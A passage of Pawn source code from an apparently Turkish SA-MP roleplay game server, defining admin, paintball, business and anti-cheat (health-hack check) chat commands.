				LinkVehicleToInterior(tmpcar, 0);
				SetVehicleVirtualWorld(tmpcar, 0);
				TelePos[playerid][0] = 0.0;TelePos[playerid][0] = 0.0;
				fVehSpeed[playerid] = 0.0;
			}
			else
			{
				SetPlayerPos(playerid, 1133.71,-1464.52,15.77);
			}
			SendClientMessage(playerid, COLOR_WHITE, "You have teleported to the Mall.");
			SetPlayerInterior(playerid,0);
			PlayerInfo[playerid][pInt] = 0;
			SetPlayerVirtualWorld(playerid, 0);
			PlayerInfo[playerid][pVW] = 0;
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	}
	return 1;
}

CMD:mark(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] >= 2)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }
        GetPlayerPos(playerid, TeleportDest[playerid][0],TeleportDest[playerid][1],TeleportDest[playerid][2]);
        TeleportDestInt[playerid] = GetPlayerInterior(playerid);
        SendClientMessage(playerid, COLOR_GRAD1, "Teleporter destination set!");
    }
    else {
        SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
    }
    return 1;
}

CMD:mark2(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] >= 2)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }
        GetPlayerPos(playerid, TeleportDest2[playerid][0],TeleportDest2[playerid][1],TeleportDest2[playerid][2]);
        TeleportDestInt2[playerid] = GetPlayerInterior(playerid);
        SendClientMessage(playerid, COLOR_GRAD1, "Teleporter destination set!");
    }
    else {
        SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
    }
    return 1;
}

CMD:pbcik(playerid, params[]) {
    if(GetPVarInt(playerid, "PBM") > 0) {
        if(GetPVarInt(playerid, "OPD") == 1)
            return SendClientMessage(playerid, COLOR_GREY, "Ölüsün, birkaç saniye bekle ve tekrar çýkmayý dene.");

	  	SetPlayerPos(playerid, 1782.8229, -1565.8177, 13.3472);
	    SetPlayerInterior(playerid, 0);
	    SetPlayerVirtualWorld(playerid, 0);

		LoadObjectsForPlayer(playerid);

		new
		    szMessage[64];

		format(szMessage, sizeof(szMessage), "%s paintball oyunundan ayrýldý.", GetPlayerNameEx(playerid));
		foreach(Player, i) {
			if(GetPVarInt(i, "PBM") > 0 && GetPVarInt(i, "PBM") == GetPVarInt(playerid, "PBM") && i != playerid)
			    SendClientMessage(i, COLOR_RED, szMessage);
		}
		DeletePVar(playerid, "PBM");
		DeletePVar(playerid, "PBMK");
		DeletePVar(playerid, "PBMD");
		DeletePVar(playerid, "PBMS");
		DeletePVar(playerid, "IsFrozen");
		if(PaintballTeam[playerid] != 0) {
		    SetPlayerToTeamColor(playerid);
		    PaintballTeam[playerid] = 0;
		}

		SetPlayerHealth(playerid, GetPVarFloat(playerid, "pbhealth"));
		SetPlayerArmourEx(playerid, GetPVarFloat(playerid, "pbarmour"));

		ResetPlayerWeapons(playerid);
		SetPlayerTeam(playerid, -1);
		PlayerInfo[playerid][pAGuns][0] = 0;
		PlayerInfo[playerid][pAGuns][1] = 0;
		PlayerInfo[playerid][pAGuns][2] = 0;
		PlayerInfo[playerid][pAGuns][3] = 0;
		PlayerInfo[playerid][pAGuns][4] = 0;
		PlayerInfo[playerid][pAGuns][5] = 0;
		PlayerInfo[playerid][pAGuns][6] = 0;
		PlayerInfo[playerid][pAGuns][7] = 0;
		PlayerInfo[playerid][pAGuns][8] = 0;
		PlayerInfo[playerid][pAGuns][9] = 0;
		PlayerInfo[playerid][pAGuns][10] = 0;
		PlayerInfo[playerid][pAGuns][11] = 0;
		SetPlayerWeapons(playerid);

		DeletePVar(playerid, "pbhealth");
		DeletePVar(playerid, "pbarmour");

		SendClientMessage(playerid, COLOR_WHITE, "Paintball'dan çýktýn.");
    }
	return 1;
}

CMD:paintball(playerid, params[]) {
    if(PlayerInfo[playerid][pConnectTime] < 2)
        return SendClientMessage(playerid, COLOR_GREY, "2 saatlik oynama süreni doldurmadýðýndan dolayý paintball oynayamazsýn.");

	if(AdminDuty[playerid] != 0)
	    return SendClientMessage(playerid, COLOR_GREY, "Adminlik yaparken paintball oynayamazsýn.");

	if(PlayerInfo[playerid][pWantedLevel] >= 1)
	    return SendClientMessage(playerid, COLOR_GREY, "Arananlar listesindeyken paintball oynayamazsýn.");

	if(PlayerCuffed[playerid] > 0 || GetPVarInt(playerid, "Injured") == 1)
		return SendClientMessage(playerid, COLOR_GREY, "Þu an bunu yapamazsýn.");

	if(IsPlayerInRangeOfPoint(playerid, 5, 1782.8229, -1565.8177, 13.3472)) {
 		new
			iPlayer = INVALID_PLAYER_ID;

	    foreach(Player, i) {
			if(GetPVarInt(i, "PBM") > 0) {
			    iPlayer = i; // always going to get the highest ID because Y_Less never added a 'break;' for foreach ~_~ ...or didn't document it
			}
	    }

	    new
	        Float: fFloat,
	        Float: aFloat;

	    GetPlayerHealth(playerid, fFloat);
	    GetPlayerArmour(playerid, aFloat);
	    SetPVarFloat(playerid, "pbhealth", fFloat);
	    SetPVarFloat(playerid, "pbarmour", aFloat);

		if(iPlayer == INVALID_PLAYER_ID)
            ShowPlayerDialogEx(playerid, 3652, DIALOG_STYLE_LIST, "Paintball - Game type", "DM\nTDM", "Go", "Iptal");
		else
		    ShowPlayerDialogEx(playerid, 3652, DIALOG_STYLE_LIST, "Paintball - Game type", "DM\nTDM\nRandom (has players in)", "Go", "Iptal");
	} else
	    SendClientMessage(playerid, COLOR_GREY, "You're not in range of the paintball venue.");

	return 1;
}

CMD:listguns(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 2)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }
		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /listguns [Oyuncu ID/Ýsim]");

		if(IsPlayerConnected(giveplayerid))
		{
			new weapons[13][2], weaponname[50];
			if(GetPVarInt(giveplayerid, "EventToken") != 0 || GetPVarInt(giveplayerid, "PBM") > 0)
			{
				SendClientMessage(playerid, COLOR_GRAD2, "That player is at an event/paintball so the weapons may appear as non-server sided.");
			}
			SendClientMessage(playerid, COLOR_GREEN,"_______________________________________");
			format(string, sizeof(string), "%s'ýn üzerindeki silahlar:", GetPlayerNameEx(giveplayerid));
			SendClientMessage(playerid, COLOR_WHITE, string);
			for (new i = 0; i < 13; i++)
			{
				GetPlayerWeaponData(giveplayerid, i, weapons[i][0], weapons[i][1]);
				if(weapons[i][0] > 0)
				{
					if(PlayerInfo[giveplayerid][pGuns][i] == weapons[i][0])
					{
						GetWeaponName(weapons[i][0], weaponname, sizeof(weaponname));
						format(string, sizeof(string), "%s (%d).", weaponname, weapons[i][0]);
						SendClientMessage(playerid, COLOR_GRAD1, string);
					}
					else
					{
						GetWeaponName(weapons[i][0], weaponname, sizeof(weaponname));
						format(string, sizeof(string), "%s (%d) (non server-side).", weaponname, weapons[i][0]);
						SendClientMessage(playerid, COLOR_GRAD1, string);
					}
				}
			}
			SendClientMessage(playerid, COLOR_GREEN,"_______________________________________");
		}
		else SendClientMessage(playerid, COLOR_GRAD1, "Geçersiz oyuncu.");
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	}
	return 1;
}

CMD:hhc(playerid, params[])
{
	return cmd_hhcheck(playerid, params);
}

CMD:hhcheck(playerid, params[])
{
	new string[128], giveplayerid;
	if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /hhcheck [Oyuncu ID/Ýsim]");

	if(IsPlayerConnected(giveplayerid))
	{
		if(PlayerInfo[playerid][pAdmin] >= 2)
		{
			if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    	{
	        	SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
				return 1;
	    	}
		    if(HHcheckFloats[giveplayerid][0] != 0)
		    {
		        SendClientMessage(playerid, COLOR_WHITE, "That player is currently being checked for health hacks!");
		        return 1;
		    }
			if(PlayerInfo[giveplayerid][pAdmin] >= PlayerInfo[playerid][pAdmin] && AdminDuty[giveplayerid] == 1)
			{
				SendClientMessage(playerid, COLOR_WHITE, "Bu komutu sana eþit veya daha yüksek leveldeki admin  üzerinde uygulayamazsýn.");
				return 1;
			}
   			if(playerTabbed[giveplayerid] != 0)
   			{
      			SendClientMessage(playerid, COLOR_WHITE, "That player is currently alt-tabbed!");
		        return 1;
   			}
			if(HHcheckUsed != 0)
		    {
		        SendClientMessage(playerid, COLOR_WHITE, "The health hack check is being used by another admin, please try again in a moment!");
		        return 1;
		    }

   			HHcheckUsed = 1;

        	format(string, sizeof(string), "{AA3333}AdminUyarýsý{FFFF00}: %s has initiated a health hack check on %s.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
        	ABroadCast(COLOR_YELLOW, string, 1);

  			format(string, sizeof(string), "Checking %s for health hacks, please wait....", GetPlayerNameEx(giveplayerid));
		    SendClientMessage(playerid, COLOR_YELLOW, string);

			GetPlayerHealth(giveplayerid, HHcheckFloats[giveplayerid][0]);
			GetPlayerArmour(giveplayerid, HHcheckFloats[giveplayerid][1]);
			GetPlayerPos(giveplayerid, HHcheckFloats[giveplayerid][2], HHcheckFloats[giveplayerid][3], HHcheckFloats[giveplayerid][4]);
			GetPlayerFacingAngle(giveplayerid, HHcheckFloats[giveplayerid][5]);
			HHcheckVW[giveplayerid] = GetPlayerVirtualWorld(giveplayerid);
			HHcheckInt[giveplayerid] = GetPlayerInterior(giveplayerid);

			DeletePVar(giveplayerid, "IsFrozen");
			TogglePlayerControllable(giveplayerid, 1);

            SetPlayerCameraPos(giveplayerid, 785.1896,1692.6887,5.2813);
			SetPlayerCameraLookAt(giveplayerid, 785.1896,1692.6887,0);
            SetPlayerVirtualWorld(giveplayerid, 0);
		    SetPlayerInterior(giveplayerid, 1);
		    SetPlayerHealth(giveplayerid, 100);
		    SetPlayerArmourEx(giveplayerid, 0);
			SetPlayerPos(giveplayerid, -1400.994873, 106.899650, 1032.273437);
			SetPlayerFacingAngle(giveplayerid, 90.66);
			CreateExplosion(-1400.994873, 106.899650 , 1032.273437, 8, 20);

			SetTimerEx("HealthHackCheck", 1250, 0, "dd", playerid, giveplayerid);
		}
		else SendClientMessage(playerid, COLOR_GREY, "Bu komutu kullanma yetkiniz yok!");
	}
	else SendClientMessage(playerid, COLOR_GRAD1, "Geçersiz oyuncu.");
	return 1;
}

forward HealthHackCheck(playerid, giveplayerid);
public HealthHackCheck(playerid, giveplayerid)
{
	new string[128];
 	if(giveplayerid == INVALID_PLAYER_ID)
    {
        SendClientMessage(playerid, COLOR_YELLOW, "The health hack check result could not be made, the player logged off.");
        HHcheckUsed = 0;
        return 1;
    }
	if(playerTabbed[giveplayerid] != 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "The health hack check result could not be made, the player alt-tabbed.");

		SetPlayerHealth(giveplayerid, HHcheckFloats[giveplayerid][0]);
		SetPlayerArmourEx(giveplayerid, HHcheckFloats[giveplayerid][1]);
		SetPlayerPos(giveplayerid, HHcheckFloats[giveplayerid][2], HHcheckFloats[giveplayerid][3], HHcheckFloats[giveplayerid][4]);
		SetPlayerFacingAngle(giveplayerid, HHcheckFloats[giveplayerid][5]);
		SetCameraBehindPlayer(giveplayerid);
		SetPlayerVirtualWorld(giveplayerid, HHcheckVW[giveplayerid]);
 		SetPlayerInterior(giveplayerid, HHcheckInt[giveplayerid]);

  		for(new i = 0; i < 6; i++)
		{
			HHcheckFloats[giveplayerid][i] = 0;
		}
		HHcheckVW[giveplayerid] = 0;
		HHcheckInt[giveplayerid] = 0;

		HHcheckUsed = 0;
  		return 1;
	}
    if(!IsPlayerInRangeOfPoint(giveplayerid,20,-1400.994873, 106.899650, 1032.273437))
    {
        SendClientMessage(playerid, COLOR_WHITE, "The health hack check result could not be made, the player was probably desynced/lagging.");

		SetPlayerHealth(giveplayerid, HHcheckFloats[giveplayerid][0]);
		SetPlayerArmourEx(giveplayerid, HHcheckFloats[giveplayerid][1]);
		SetPlayerPos(giveplayerid, HHcheckFloats[giveplayerid][2], HHcheckFloats[giveplayerid][3], HHcheckFloats[giveplayerid][4]);
		SetPlayerFacingAngle(giveplayerid, HHcheckFloats[giveplayerid][5]);
		SetCameraBehindPlayer(giveplayerid);
		SetPlayerVirtualWorld(giveplayerid, HHcheckVW[giveplayerid]);
 		SetPlayerInterior(giveplayerid, HHcheckInt[giveplayerid]);

  		for(new i = 0; i < 6; i++)
		{
			HHcheckFloats[giveplayerid][i] = 0;
		}
		HHcheckVW[giveplayerid] = 0;
		HHcheckInt[giveplayerid] = 0;

        HHcheckUsed = 0;
		return 1;
    }

    new Float:health;
    GetPlayerHealth(giveplayerid, health);
    if(health == 100)
	{
        SendClientMessage(playerid, COLOR_GREEN, "____________________ CAN HILESI SONUCLARI _______________");
        format(string, sizeof(string), "The health hack check on %s was {00F70C}positive{FFFFFF}. The player may be health hacking.", GetPlayerNameEx(giveplayerid));
        SendClientMessage(playerid, COLOR_WHITE, string);
        SendClientMessage(playerid, COLOR_WHITE, "Health before check: 100.0");
        format(string, sizeof(string), "Health after check: %.1f", health);
        SendClientMessage(playerid, COLOR_WHITE, string);
        SendClientMessage(playerid, COLOR_GREEN, "_______________________________________________________________");
    }
    else
	{
        SendClientMessage(playerid, COLOR_GREEN, "____________________ CAN HILESI SONUCLARI _______________");
        format(string, sizeof(string), "The health hack check on %s was {FF0606}negative{FFFFFF}. The player was not health hacking.", GetPlayerNameEx(giveplayerid));
        SendClientMessage(playerid, COLOR_WHITE, string);
        SendClientMessage(playerid, COLOR_WHITE, "Health before check: 100.0");
        format(string, sizeof(string), "Health after check: %.1f", health);
        SendClientMessage(playerid, COLOR_WHITE, string);
        SendClientMessage(playerid, COLOR_GREEN, "_______________________________________________________________");
    }

	SetPlayerHealth(giveplayerid, HHcheckFloats[giveplayerid][0]);
	SetPlayerArmourEx(giveplayerid, HHcheckFloats[giveplayerid][1]);
	SetPlayerPos(giveplayerid, HHcheckFloats[giveplayerid][2], HHcheckFloats[giveplayerid][3], HHcheckFloats[giveplayerid][4]);
	SetPlayerFacingAngle(giveplayerid, HHcheckFloats[giveplayerid][5]);
	SetCameraBehindPlayer(giveplayerid);
	SetPlayerVirtualWorld(giveplayerid, HHcheckVW[giveplayerid]);
 	SetPlayerInterior(giveplayerid, HHcheckInt[giveplayerid]);

  	for(new i = 0; i < 6; i++)
	{
		HHcheckFloats[giveplayerid][i] = 0;
	}
	HHcheckVW[giveplayerid] = 0;
	HHcheckInt[giveplayerid] = 0;

    HHcheckUsed = 0;
    return 1;
}

CMD:a(playerid, params[])
{
	return cmd_admin(playerid, params);
}
CMD:aksessuaral(playerid, params[])
{
	return cmd_oyuncakal(playerid, params);
}

CMD:admin(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 1) {
		if(!isnull(params)) {
			new szMessage[128];
			format(szMessage, sizeof(szMessage), "* Level %d Admin %s: {98F5EB}%s", PlayerInfo[playerid][pAdmin], GetPlayerNameEx(playerid), params);
			ABroadCast(COLOR_RED, szMessage, 1);
		}
		else SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: (/a)dmin [admin chat]");
	}
	return 1;
}

CMD:cnn(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 4)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }
		if(!isnull(params)) {

			new
				szMessage[128];

			format(szMessage, sizeof(szMessage), "~b~%s: ~w~%s",GetPlayerNameEx(playerid), params);
			foreach(Player, i) GameTextForPlayer(i, szMessage, 5000, 6);
		}
		else SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /cnn [mesaj]. ~n~ = new line, ~r~ = red, ~g~ = green, ~b~ = blue, ~w~ = white, ~y~ = yellow.");
	}
	else SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	return 1;
}

CMD:cnnn(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 5)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		new
			iTextID,
			szMessage[128];

		if(sscanf(params, "is[128]", iTextID, szMessage)) {
			SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /cnnn [type 1-6] [mesaj]. ~n~ = new line, ~r~ = red, ~g~ = green, ~b~ = blue, ~w~ = white, ~y~ = yellow.");
		}
		else if(!(0 <= iTextID <= 6 && iTextID != 2)) {
			SendClientMessage(playerid, COLOR_GRAD2, "Text ID must be between 0 and 6, but not 2 (due to SA:MP bugs).");
		}
		else foreach(Player, i) GameTextForPlayer(i, szMessage, 5000, iTextID);
	}
	else SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	return 1;
}

CMD:motd(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] >= 7)
    {
  		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		if(isnull(params)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /motd [mesaj]");
		new string[128];
    	format(string, sizeof(string), "%s, Global haberleri '%s' olarak deðiþtirdi.", GetPlayerNameEx(playerid), params);
		ABroadCast(COLOR_LIGHTRED, string, 5);
		format(GlobalMOTD, sizeof(GlobalMOTD), "%s", params);
		SendClientMessage(playerid, COLOR_WHITE, "Global haberleri deðiþtirdin.");

		format(string, sizeof(string), "Haberler: %s", params);
		TextDrawSetString(MainMenuTxtdraw[6], string);

		Misc_Save();
	}
	return 1;
}

CMD:amotd(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] >= 5)
    {
    	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }
		if(isnull(params)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /amotd [mesaj]");
		new string[128];
		format(AdminMOTD, sizeof(AdminMOTD), "%s", params);
		format(string, sizeof(string), "AdminKomutu: %s, admin haberlerini '%s' olarak deðiþtirdi.", GetPlayerNameEx(playerid), params);
		ABroadCast(COLOR_LIGHTRED, string, 5);
		SendClientMessage(playerid, COLOR_WHITE, "Admin haberlerini güncellediniz.");
		Misc_Save();
	}
	return 1;
}

CMD:paused(playerid, params[]) {
    if(PlayerInfo[playerid][pAdmin] >= 2)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

    	new
			szMessage[42 + MAX_PLAYER_NAME];

	    SendClientMessage(playerid,COLOR_WHITE,"ALT-TAB yapmýþ oyuncu listesi.");
	    foreach(Player, i) if(playerTabbed[i] != 0) {
			if(playerTabbedTime[i] > 60) format(szMessage, sizeof(szMessage), "* %s (ID %d) adlý oyuncu %d dakikadýr ALT-TAB'da.", GetPlayerNameEx(i), i, playerTabbedTime[i] / 60);
			else format(szMessage, sizeof(szMessage), "* %s (ID %d) adlý oyuncu %d saniyedir ALT-TAB'da.", GetPlayerNameEx(i), i, playerTabbedTime[i]);

			if(PlayerInfo[i][pAdmin] >= 2) SendClientMessage(playerid,COLOR_WHITE, szMessage);
			else SendClientMessage(playerid,COLOR_GREY, szMessage);
  		}
   	}
    else SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanmaya yetkin yok.");
	return 1;
}

CMD:hafk(playerid, params[]) {
    if(PlayerInfo[playerid][pHelper] >= 5)
	{
    	new
			szMessage[36 + MAX_PLAYER_NAME];

	    SendClientMessage(playerid,COLOR_WHITE,"AFK oyuncu listesi...");
	    foreach(Player, i) if(playerAFK[i] != 0 && playerAFKTime[i] > 60) {
			format(szMessage,sizeof(szMessage),"* %s (ID %d) adlý oyuncu %d dakikadýr AFK.", GetPlayerNameEx(i), i, playerAFKTime[i] / 60);
			if(PlayerInfo[i][pAdmin] >= 2) SendClientMessage(playerid,COLOR_RED,szMessage);
			else SendClientMessage(playerid,COLOR_GREY,szMessage);
  		}
   	}
    else SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanmaya yetkin yok.");
	return 1;
}

CMD:afk(playerid, params[]) {
    if(PlayerInfo[playerid][pAdmin] >= 2)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

    	new
			szMessage[36 + MAX_PLAYER_NAME];

	    SendClientMessage(playerid,COLOR_WHITE,"AFK oyuncu listesi...");
	    foreach(Player, i) if(playerAFK[i] != 0 && playerAFKTime[i] > 60) {
			format(szMessage,sizeof(szMessage),"* %s (ID %d) adlý oyuncu %d dakikadýr AFK.", GetPlayerNameEx(i), i, playerAFKTime[i] / 60);
			if(PlayerInfo[i][pAdmin] >= 2) SendClientMessage(playerid,COLOR_RED,szMessage);
			else SendClientMessage(playerid,COLOR_GREY,szMessage);
  		}
   	}
    else SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanmaya yetkin yok.");
	return 1;
}

CMD:gotoco(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 2)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		new Float: pos[3], int;
		if(sscanf(params, "fffd", pos[0], pos[1], pos[2], int)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /gotoco [x coordinate] [y coordinate] [z coordinate] [interior]");

		SendClientMessage(playerid, COLOR_GRAD2, "Girilen koordinatlara teleport oldun.");
		SetPlayerPos(playerid, pos[0], pos[1], pos[2]);
		SetPlayerInterior(playerid, int);
	}
	return 1;
}

CMD:isyerial(playerid, params[])
{
	new string[128], done;
	if(PlayerInfo[playerid][pBiz]) return SendClientMessage(playerid, COLOR_GREY, "Zaten bir iþ yerin var.");
	for(new idx=1; idx<MAX_BIZ; idx++)
	{
	    if(IsPlayerInRangeOfPoint(playerid, 2, BizInfo[idx][bX], BizInfo[idx][bY], BizInfo[idx][bZ]))
	    {
			if(!strcmp("GOV", BizInfo[idx][bOwner], false))
			{
			    if(PlayerInfo[playerid][pCash] < BizInfo[idx][bPrice]) return SendClientMessage(playerid, COLOR_GREY, "Bu iþ yerini almak için yeterli miktarda paran yok.");
				GivePlayerCash(playerid, -BizInfo[idx][bPrice]);
				if(PlayerInfo[playerid][pBiz]) PlayerInfo[playerid][pVBiz] = idx;
				else PlayerInfo[playerid][pBiz] = idx;
			    format(BizInfo[idx][bOwner], 32, "%s", RPNU(playerid));
			    format(string, sizeof(string), "ID: %d\n%s\nSahibi: %s\nDurum: %s", idx, RBT(idx), BizInfo[idx][bOwner], RBS(idx));
				UpdateDynamic3DTextLabelText(BizInfo[idx][bText], COLOR_WHITE, string);
				SendClientMessage(playerid, COLOR_GREEN, " Baþarýyla bu iþ yerini satýn aldýnýz.");
				SendClientMessage(playerid, COLOR_WHITE, " /isyeriyardim yazarak komutlarýnýzý görebilirsiniz.");
				format(string, sizeof(string), "%s adlý kiþi id %d iþ yerini satýn aldý.", RPN(playerid), idx);
				Log("logs/business.log", string);
				idx = MAX_BIZ;
				done = 1;
			}
			if(idx == MAX_BIZ-1 && !done)
			{
			    SendClientMessage(playerid, COLOR_GREY, "Bu iþ yerinin zaten bir sahibi var");
			}
	    }
	    if(idx == MAX_BIZ-1 && !done)
	    {
	        SendClientMessage(playerid, COLOR_GREY, "Satýn alýnabilecek bir iþ yerinin yakýnýnda deðilsiniz.");
	    }
	}
	return 1;
}
/*
CMD:isyerinidevletesat(playerid, params[])
{
	new string[128];
	if(!PlayerInfo[playerid][pBiz] && !PlayerInfo[playerid][pVBiz]) return SendClientMessage(playerid, COLOR_GREY, "Ýþ yeri sahibi deðilsin.");
	if(sscanf(params, "s[8]", params)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /isyerinidevletesat [onayla]");
	if(!strcmp(params, "onayla", true))
	{
	    new done;
	    if(IsPlayerInRangeOfPoint(playerid, 2, BizInfo[PlayerInfo[playerid][pBiz]][bX], BizInfo[PlayerInfo[playerid][pBiz]][bY], BizInfo[PlayerInfo[playerid][pBiz]][bZ]))
	    {
	        GivePlayerCash(playerid, (75*BizInfo[PlayerInfo[playerid][pBiz]][bPrice])/100);
			BizInfo[PlayerInfo[playerid][pBiz]][bStatus] = 0;
		    format(BizInfo[PlayerInfo[playerid][pBiz]][bOwner], 32, "GOVUN");
		    format(string, sizeof(string), "ID: %d\n%s\nSahibi: %s\nDurum: Satýlýk\nFiyat: %d $", PlayerInfo[playerid][pBiz], RBT(PlayerInfo[playerid][pBiz]), BizInfo[PlayerInfo[playerid][pBiz]][bOwner], BizInfo[PlayerInfo[playerid][pBiz]][bPrice]);
		    UpdateDynamic3DTextLabelText(BizInfo[PlayerInfo[playerid][pBiz]][bText], COLOR_WHITE, string);
		    SendClientMessage(playerid, COLOR_GREEN, " Ýþ yerini devlete baþarýyla sattýn. (Orijinal fiyatýn yüzde 75 i geri ödendi)");
            format(string, sizeof(string), "%s id %d olan isyerini markete sattý.", RPN(playerid), PlayerInfo[playerid][pBiz]);
			Log("logs/business.log", string);
			PlayerInfo[playerid][pBiz] = 0;
			done = 1;
	    }
	    if(!done)
	    {
	        new idx = PlayerInfo[playerid][pVBiz];
   	 		if(IsPlayerInRangeOfPoint(playerid, 2, BizInfo[idx][bX], BizInfo[idx][bY], BizInfo[idx][bZ]))
		    {
		        GivePlayerCash(playerid, (75*BizInfo[idx][bPrice])/100);
				BizInfo[idx][bStatus] = 0;
			    format(BizInfo[idx][bOwner], 32, "GOVUN");
			    format(string, sizeof(string), "ID: %d\n%s\nSahibi: %s\nDurum: Satýlýk\nFiyat: %d $", idx, RBT(idx), BizInfo[idx][bOwner], BizInfo[idx][bPrice]);
			    UpdateDynamic3DTextLabelText(BizInfo[idx][bText], COLOR_WHITE, string);
			    SendClientMessage(playerid, COLOR_GREEN, " Ýþ yerini baþarýyla devlete sattýn. (Orijinal fiyatýn yüzde 75 i geri ödendi)");
	            format(string, sizeof(string), "%s id %d iþ yerini baþarýyla devlete sattý.", RPN(playerid), idx);
				Log("logs/business.log", string);
				PlayerInfo[playerid][pVBiz] = 0;
				done = 1;
		    }
	    }
		if(!done)
	    {
	        SendClientMessage(playerid, COLOR_GREY, "Ýþ yerinin yakýnýnda deðilsin.");
	        return 1;
	    }
    }
	return 1;
}
*/
CMD:isyeriyardim(playerid, params[])
{
	SendClientMessage(playerid, COLOR_YELLOW, "IS YERI: {FFFFFF}/isyerial");
	if(PlayerInfo[playerid][pBiz] || PlayerInfo[playerid][pVBiz]) SendClientMessage(playerid, COLOR_YELLOW, "IS YERI SAHIBI: {FFFFFF}/kasa /ikilit");
	return 1;
}

CMD:egotoco(playerid, params[])
{
	if(PlayerInfo[playerid][pEmlak] == 1)
	{

		new Float: pos[3], int;
		if(sscanf(params, "fffd", pos[0], pos[1], pos[2], int)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /gotoco [x coordinate] [y coordinate] [z coordinate] [interior]");

		SendClientMessage(playerid, COLOR_GRAD2, "Girilen koordinatlara teleport oldun. (BUNLAR LOGLARA KAYITLIDIR KÖTÜ AMAÇLI KULLANMA !)");
		SetPlayerPos(playerid, pos[0], pos[1], pos[2]);
		SetPlayerInterior(playerid, int);
	}
	return 1;
}

CMD:check(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 1)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		new giveplayerid;
		if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_GRAD1, "KULLANIM: /check [Oyuncu ID/Ýsim]");

		if(IsPlayerConnected(giveplayerid))
		{
			ShowStats(playerid,giveplayerid);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GRAD1, "Geçersiz oyuncu.");
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	}
	return 1;
}

CMD:ocheck(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] < 3)
		return SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");

	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

	if(isnull(params))
		return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /ocheck [name]");

	new
		giveplayerid = ReturnUser(params);

